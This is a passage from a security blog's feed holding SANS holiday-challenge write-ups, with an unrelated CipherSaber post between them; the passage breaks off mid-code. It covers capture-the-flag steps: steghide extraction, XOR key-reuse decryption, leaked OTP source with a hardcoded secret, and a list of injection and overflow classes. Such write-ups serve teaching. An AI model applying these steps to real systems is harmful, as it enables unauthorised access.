Its CPU architecture is 32-bit ARM. The web interface is built
with NodeJS, with Jade Node as the template engine.&lt;/p&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;What kind of a database engine is used to support the Gnome web
interface? What is the plaintext password stored in the Gnome database?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The database engine is MongoDB. The plaintex password is
&lt;code&gt;SittingOnAShelf&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;What are the IP addresses of the five SuperGnomes scattered around the
world, as verified by Tom Hessman in the Dosis neighborhood?&lt;/li&gt;
&lt;li&gt;Where is each SuperGnome located geographically?&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;SuperGnome01: 52.2.229.189, located in United States, Ashburn (VI)&lt;/li&gt;
&lt;li&gt;SuperGnome02: 52.34.3.80, located in United States, Portland (OR)&lt;/li&gt;
&lt;li&gt;SuperGnome03: 52.64.191.71, located in Australia, Sydney&lt;/li&gt;
&lt;li&gt;SuperGnome04: 52.192.152.132, located in Japan, Tokyo&lt;/li&gt;
&lt;li&gt;SuperGnome05: 54.233.105.81, located in Brazil, Sao Paulo&lt;/li&gt;
&lt;/ul&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;Please describe the vulnerabilities you discovered in the
Gnome firmware.&lt;/li&gt;
&lt;li&gt;Describe the technique you used to gain access to each SuperGnomeâ€™s
gnome.conf file.&lt;/li&gt;
&lt;/ol&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;SuperGnome01: Credentials stored in plaintext. Reuse of credentials.&lt;/li&gt;
&lt;li&gt;SuperGnome02: Arbitrary folder creation. Local file inclusion.&lt;/li&gt;
&lt;li&gt;SuperGnome03: NoSQL injection&lt;/li&gt;
&lt;li&gt;SuperGnome04: Server Side JavaScript injection&lt;/li&gt;
&lt;li&gt;SuperGnome05: Buffer-overflow&lt;/li&gt;
&lt;/ul&gt;
&lt;ol class="arabic simple" start="9"&gt;
&lt;li&gt;Based on evidence you recover from the SuperGnomesâ€™ packet capture ZIP
files and any staticky images you find, what is the nefarious plot of
ATNAS Corporation?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The plot of the ATNAS Corporation is to sell millions of Gnomes to families,
so that they can identify valuable objects, and then come and steal it during
Christmas night, by disguising themselves as Santy Claus.&lt;/p&gt;
&lt;ol class="arabic simple" start="10"&gt;
&lt;li&gt;Who is the villain behind the nefarious plot?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The villain is none other that
&lt;a class="reference external" href="http://seuss.wikia.com/wiki/Cindy_Lou_Who"&gt;Cindy Lou Who&lt;/a&gt;. After being
traumatised by the Grinch stealing Christmas, she has developped a deep
hatred for this holiday.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I really enjoyed doing this challenge, because it allowed me to develop
my skills in technologies I'm not familiar with, such as NoSQL database
engines, or buffer-overflow (something I should really work on).&lt;/p&gt;
&lt;p&gt;Many thanks to the SANS institute for this incredible Christmas Challenge!&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>May the Cipher be with you</title><link href="https://allyourbase.utouch.fr/posts/2013/02/03/may-the-cipher-be-with-you/" rel="alternate"></link><updated>2013-02-03T01:42:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2013-02-03:posts/2013/02/03/may-the-cipher-be-with-you/</id><summary type="html">&lt;img alt="ciphersaber-logo.png" class="align-center" src="/images/may-the-cipher-be-with-you/ciphersaber-logo.png" /&gt;
&lt;p&gt;NB: I know that implementing cryptographic algorithms yourself is
dangerous. There are many implementation problems people won't think
about, like memory management. I just wanted to talk about the
CipherSaber because I think it's an old, yet neat project. I think it's
important to sensitize people about cryptography and the regulations
around its usage. &lt;strong&gt;If you want to use cryptography to protect your
privacy, I suggest you look at a more serious project like PGP.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A few months ago, while checking my RSS feeds, I saw &lt;a class="reference external" href="http://www.reddit.com/r/netsec/comments/10d7zb/are_there_any_inprogress_opensource_cryptography/"&gt;this discussion&lt;/a&gt;
on Reddit. Since I love cryptography and FLOSS, I looked at the comment
section, to see what kind of answers were posted.&lt;/p&gt;
&lt;p&gt;One comment caught my attention:&lt;/p&gt;
&lt;img alt="ciphersaber-comment.png" class="align-center" src="/images/may-the-cipher-be-with-you/ciphersaber-comment.png" /&gt;
&lt;p&gt;What intrigued me was the idea of creating your own &amp;quot;something&amp;quot; (plus,
the &amp;quot;something&amp;quot; had a really cool name), and I also like the fact that I
could start right away.&lt;/p&gt;
&lt;p&gt;So, I went to the &lt;a class="reference external" href="http://ciphersaber.gurus.org/"&gt;CipherSaber&lt;/a&gt; web
page, to see what's what. And, being the privacy advocate that I am, I
was not disappointed. The CipherSaber is a form of protest against US
ban on cryptography.&lt;/p&gt;
&lt;p&gt;It was written after 9/11, when the US government wanted to limit the
use/publication of cryptography, in order to prevent the terrorists from
using it. It's, of course, a ridiculous idea, since the crypto is
&lt;em&gt;already&lt;/em&gt; out there, and anybody can use it, even the terrorists: it's
a little too late to try to prevent cryptography export. Plus, as stated
in the CipherSaber web page, nothing would prevent terrorists to send
some of their members to US universities to learn cryptography, as they
do to learn chemistry, nuclear engineering etc.&lt;/p&gt;
&lt;p&gt;As my good friend (okay, we've never met, but still, he has a point)
Philip Zimmermann said:&lt;/p&gt;
&lt;blockquote&gt;
If privacy is outlawed, only outlaws will have privacy.&lt;/blockquote&gt;
&lt;p&gt;The idea behind the CipherSaber, is to have everyone implementing a
strong crypto algorithm, so that people don't rely on products that can
be banned. The chosen algorithm is the stream cipher RC4, because it's
strong, and easy to implement (see CipherSaber-2 in the web page to
correct a known vulnerability in RC4). The name CipherSaber comes from
Star Wars, because every Jedi knight has to build its own light saber,
just like every CipherKnight should implement its own CipherSaber.&lt;/p&gt;
&lt;p&gt;I know I'm not from the US, and I know this web page was written ten
years ago, but I like the idea of being a part of some community, and
Internet ban concern everyone. That's why I've decided to revamp the
CipherKnight's certificate (the old one, in addition to being hard to
find, is too directed towards Americans).&lt;/p&gt;
&lt;p&gt;All you have to do to get your certificate is to enter your name, click
the button, and decipher it using your own CipherSaber (the encryption
key is &lt;em&gt;AlanTuring&lt;/em&gt;).&lt;/p&gt;
&lt;form action="/cscertificate/index.php" method="post"&gt;
     &lt;label for="name"&gt;Name&lt;/label&gt;: &lt;input name="name" type="text"&gt; &lt;input value="Get your certificate!" type="submit"&gt;
&lt;/form&gt;&lt;p&gt;If you're old school, you can get the former CipherKnight's certificate
&lt;a class="reference external" href="https://allyourbase.utouch.fr/wp-content/uploads/2014/08/cknight.cs1"&gt;here&lt;/a&gt;
(the encryption key is &lt;em&gt;ThomasJefferson&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;So go ahead, forge your own CipherSaber, print out your certificate, and
spread the word.&lt;/p&gt;
&lt;p&gt;May the Cipher be with you.&lt;/p&gt;
</summary></entry><entry><title>SANS Christmas Challenge 2012</title><link href="https://allyourbase.utouch.fr/posts/2013/01/07/sans-christmas-challenge-2012/" rel="alternate"></link><updated>2013-01-07T12:20:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2013-01-07:posts/2013/01/07/sans-christmas-challenge-2012/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2012_logo.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/sans_christmas_challenge_2012_logo.jpg" /&gt;
&lt;p&gt;During December, SANS posted a &lt;a class="reference external" href="http://pen-testing.sans.org/holiday-challenge/2012"&gt;Christmas
challenge&lt;/a&gt; based
on a Christmas story.&lt;/p&gt;
&lt;p&gt;This year, Santa is sad because he feels that nobody believes in him
anymore, so he decides to cancel Christmas. Mrs. Claus wants to cheer
her husband up, in order not to let children down, but her reindeer gets
imprisoned in Southtown's dog pound. The mayor accepts to let Vixen, the
reindeer, go if Mrs. Claus can make it snow in Southtown, which is a
relatively hot region.&lt;/p&gt;
&lt;p&gt;So Mrs. Claus goes to see Snow Miser, who is in charge of the cold
weather. Unfortunately, he refuses to make it snow in Southtown, because
it's in his brother's, Heat Miser, territory. But Heat Miser agrees to
make it snow in Southtown as long as he's allowed to melt the North
Pole. Unfortunately, the brothers are too stubborn, and refuse to let
each other have control over the other's territory. So Mrs. Claus takes
it to a higher authority: Mother Nature, who forces the brothers to
cooperate.&lt;/p&gt;
&lt;p&gt;Since they have to collaborate, Snow Miser and Heat Miser decide to
have a little fun and make it a competition: they both have to hack
every level of the other brother's weather control. You can follow
&lt;a class="reference external" href="https://twitter.com/sn0w_m1s3r"&gt;&amp;#64;sn0w_m1s3r&lt;/a&gt; and
&lt;a class="reference external" href="https://twitter.com/h34t_m1s3r"&gt;&amp;#64;h34t_m1s3r&lt;/a&gt; on Twitter.&lt;/p&gt;
&lt;p&gt;To make things interesting, SANS posted six questions, and will
reward the best answers:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;Where did you find the remainder of Snow Miser's Zone 1 URL?&lt;/li&gt;
&lt;li&gt;What is the key you used with steghide to extract Snow Miser's Zone 2
URL? Where did you find the key?&lt;/li&gt;
&lt;li&gt;On Snow Miser's Zone 3 page, why is using the same key multiple times
a bad idea?&lt;/li&gt;
&lt;li&gt;What was the coding error in Zone 4 of Heat Miser's site that allowed
you to find the URL for Zone 5?&lt;/li&gt;
&lt;li&gt;How did you manipulate the cookie to get to Zone 5 of Heat Miser's
Control System?&lt;/li&gt;
&lt;li&gt;Please briefly describe the process, steps, and tools you used to
conquer each zone, including all of the flags hidden in the comments
of each zone page.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I'll focus on the sixth question, while answering the first questions in
my write up.&lt;/p&gt;
&lt;div class="section" id="snow-miser"&gt;
&lt;h2&gt;&lt;a class="reference external" href="http://snowmiser.counterhack.com/"&gt;Snow Miser&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="zone-0"&gt;
&lt;h3&gt;Zone 0&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;3b5a630fc67251aa5555f4979787c93f&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Unlike my brother, my fridged minions (without freakish hair) didn't
mess up and leak our URLs to search engines or have to block them
from the search engines. There is no vulnerability to get to the
next zone and you will not find a vulnerability here. Move along.&lt;/p&gt;
&lt;p&gt;Those of you with proper access, the URL you need starts with the
following:&lt;/p&gt;
&lt;p&gt;zone-1-D2E31380-50E6-4869-8A85-XXXXXXXXXXXX&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The URL is composed only of digits (0 through 9) and letters (A through
F), which gives us 281.474.976.710.656 possible combinations. We can't
bruteforce so many combinations (plus, it's explicitly stated in the
challenge's rules that bruteforce is disallowed).&lt;/p&gt;
&lt;p&gt;Fortunately, Snow Miser tweets this message:&lt;/p&gt;
&lt;img alt="snow_miser_tweet_1.png" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_tweet_1.png" /&gt;
&lt;p&gt;Here's the posted image:&lt;/p&gt;
&lt;img alt="snow_miser_glass_reflection.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_glass_reflection.jpg" /&gt;
&lt;p&gt;We can see in the something interesting in the screen's reflection in
the glass: the end of the URL we're looking for. With a tool like GIMP,
we can manipulate the image to make it easier to read it:&lt;/p&gt;
&lt;img alt="snow_miser_glass_reflection_enhanced.jpg" class="align-center" src="/images/sans-christmas-challenge-2012/snow_miser_glass_reflection_enhanced.jpg" /&gt;
&lt;p&gt;Which gives us this final URL:
zone-1-D2E31380-50E6-4869-8A85-F9CDB3AF6226&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-1"&gt;
&lt;h3&gt;Zone 1&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;38bef0b61ba8edda377b626fe6708bfa&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
One of my minions, who has been turned into a snowman, messed up and
changed the URL for Zone 2. If you have access to this level you can
analyze the images and access the next zone.&lt;/blockquote&gt;
&lt;p&gt;This message kind of points to some sort of steganography use. This is
where the second question helps us. We know the program steghide was
used on a image. While looking at the website's images, we can see that
they're all PNG, except for &lt;a class="reference external" href="/images/sans-christmas-challenge-2012/off.jpg"&gt;this
one&lt;/a&gt;,
which is JPG. Since steghide doesn't support PNG, we know that the URL
is hidden in the last image.&lt;/p&gt;
&lt;p&gt;Now, we need to find the key, in order to extract the hidden file. If
you open the image in a hexadecimal editor, you'll find an ASCII string,
&amp;quot;IceIceBaby!&amp;quot;. Let's use it as the key:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;steghide extract -sf off.jpg
Enter passphrase: IceIceBaby!
Extracted data written to tmpfile.txt
&lt;span class="nv"&gt;$ &lt;/span&gt;cat tmpfile.txt
zone-2-6D46A633-25D7-42C8-AF94-8E786142A3E3
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-2"&gt;
&lt;h3&gt;Zone 2&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;b8231c2bac801b54f732cfbdcd7e47b7&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The same minion that messed up the Zone 2 link also messed up the
Zone 3 link. Make sure you use the new link that starts with:&lt;/p&gt;
&lt;p&gt;zone-3-EAB6B031-4EFA-49F1-B542-XXXXXXXXXXXX&lt;/p&gt;
&lt;p&gt;Please do not tweet the links or parts of the links.&lt;/p&gt;
&lt;p&gt;All security issues that used to allow access to the next zone have
been fixed. There is no vulnerability to get to the next zone and
you will not find a vulnerability here. Move along.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Heat Miser kindly tweets:&lt;/p&gt;
&lt;img alt="heat_miser_tweet_2.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_tweet_2.png" /&gt;
&lt;p&gt;You can retrieve Snow Miser's data
&lt;a class="reference external" href="/docs/sans-christmas-challenge-2012/android.data_.tar.gz"&gt;here&lt;/a&gt;
(sha256:
&lt;code&gt;286387c77b533aae4d605d85a5e74c819f3e0ca7ca42b991ddd29abf9ff5a6b4&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;After extracting it, we can use some shell mojo to find files mentioning
the zone 3 URL:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xzvf android.data.tgz
&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;cd &lt;/span&gt;data
&lt;span class="nv"&gt;$ &lt;/span&gt;grep -Rn &lt;span class="s2"&gt;&amp;quot;zone-3&amp;quot;&lt;/span&gt; . 2&amp;gt; /dev/null
Binary file ./data/com.android.browser/cache/browser_state.parcel
concordant
Binary file
./data/com.android.browser/cache/webviewCacheChromium/data_1 concordant
Binary file
./data/com.android.browser/cache/webviewCacheChromium/data_2 concordant
Binary file ./data/com.android.browser/databases/browser2.db
concordant
Binary file ./data/com.android.browser/databases/browser2.db-wal
concordant
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The first file looks is a browser cache file, which may contain the
wanted URL. By reading it, we'll find:
zone-3-EAB6B031-4EFA-49F1-B542-30EBE9EB3962&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-3"&gt;
&lt;h3&gt;Zone 3&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;08ba610172aade5d1c8ea738013a2e99&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;To reduce the impact of URL exposure or modification we have added a
new mechanism to distribute changes to the URL (thanks to that
minion that broke Zones 2+). Those of you with with access to Zone 4
should have received an encryption key. This key can be used to
decrypt the URL for Zone 4. This allows us to securely communicate
it to you without risk of unauthorized access.&lt;/p&gt;
&lt;p&gt;To verify your key you can check the previous Zone 4 URL:&lt;/p&gt;
&lt;p&gt;zone-4-F7677DA8-3D77-11E2-BB65-E4BF6188709B&lt;/p&gt;
&lt;p&gt;20d916c6c29ee53c30ea1effc63b1c72147eb86b998a25c0cf1bf66939e8621b3132d83abb1683df619238&lt;/p&gt;
&lt;p&gt;The new Zone 4 encrypted string is:
20d916c6c29ee54343e81ff1b14c1372650cbf19998f51b5c51bf66f49ec62184034a94fc9198fa9179849&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We know the cipher texts both encrypt plain texts starting with zone-4-,
and by looking at them, we can see that they both start with the same
letters. It hints to a bytewise encryption scheme. It turns out that
it's a XOR encryption. The first &amp;quot;oops&amp;quot; here, is that since we're given
a plain text and its cipher text, we can recover the whole key. Indeed,
by the propriety of the XOR operator (here denoted by &lt;span class="formula"&gt;âŠ•&lt;/span&gt;):&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;span class="formula"&gt;&lt;i&gt;c&lt;/i&gt;â€…=â€…&lt;i&gt;k&lt;/i&gt;âŠ•&lt;i&gt;p&lt;/i&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class="formula"&gt;&lt;i&gt;c&lt;/i&gt;âŠ•&lt;i&gt;p&lt;/i&gt;â€…=â€…&lt;i&gt;k&lt;/i&gt;âŠ•&lt;i&gt;p&lt;/i&gt;âŠ•&lt;i&gt;p&lt;/i&gt;â€…=â€…&lt;i&gt;k&lt;/i&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The second &amp;quot;oops&amp;quot; is using the same key twice, because now that we have
the key, we can decrypt the second cipher text:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;#!/usr/bin/python&lt;/span&gt;
&lt;span class="c"&gt;#-*- encoding: Utf-8 -*-&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;usage: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt; &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;

    &lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cipher1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cipher2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;
    &lt;span class="n"&gt;plain2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;xrange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
        &lt;span class="n"&gt;plain2&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;plain2&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now let's launch this program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ls
xor_encrypt.py
&lt;span class="nv"&gt;$ &lt;/span&gt;./xor_enc.py zone-4-F7677DA8-3D77-11E2-BB65-E4BF6188709B
20d916c6c29ee53c30ea1effc63b1c72147eb86b998a25c0cf1bf66939e8621b3132d83abb1683df619238
20d916c6c29ee54343e81ff1b14c1372650cbf19998f51b5c51bf66f49ec62184034a94fc9198fa9179849
zone-4-9D469367-B60E-4E08-BDF1-FED7CC74AF33
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="zone-4"&gt;
&lt;h3&gt;Zone 4&lt;/h3&gt;
&lt;p&gt;flag: &lt;code&gt;de32b158f102a60aba7de3ee8d5d265a&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Zone 5 requires top security. We are updating the code using svn 1.7
and have implemented One-Time-Password (OTP) functionality to access
Zone 5.&lt;/p&gt;
&lt;p&gt;The passwords are in a SHA1 format, so they are unguessable.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we look at the source code, we can see that the One Time Password is
sent to the zone 5 URL, so we don't have to look very far to find it.
But if we try to access it directly, we're redirected to a page,
noaccess.php. With this tweet, Heat Miser gives us a big hint:&lt;/p&gt;
&lt;img alt="heat_miser_tweet_3.png" class="align-center" src="/images/sans-christmas-challenge-2012/heat_miser_tweet_3.png" /&gt;
&lt;p&gt;By looking at &lt;a class="reference external" href="http://pen-testing.sans.org/blog/pen-testing/2012/12/06/all-your-svn-are-belong-to-us"&gt;the tutorial he
gives&lt;/a&gt;
(see, this meme doesn't get old!) we can get the index page source code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;generate_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$time&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nv"&gt;$pass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;$time&lt;/span&gt;&lt;span class="s2"&gt; 7998f77a7dc74f182a76219d7ee58db38be3841c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$pass&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;verify_otp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$inpass&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="c1"&gt;// passwords are valid for up to 3 minutes&lt;/span&gt;
        &lt;span class="c1"&gt;// don&amp;#39;t forget to use the server time (see the noaccess.php page)&lt;/span&gt;
        &lt;span class="nv"&gt;$validstamps&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;+1 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt; &lt;span class="c1"&gt;// added just in case the time sync is off&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-1 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
            &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Y-m-d H:i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;strtotime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-2 minute&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
        &lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$validstamps&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nv"&gt;$stamp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
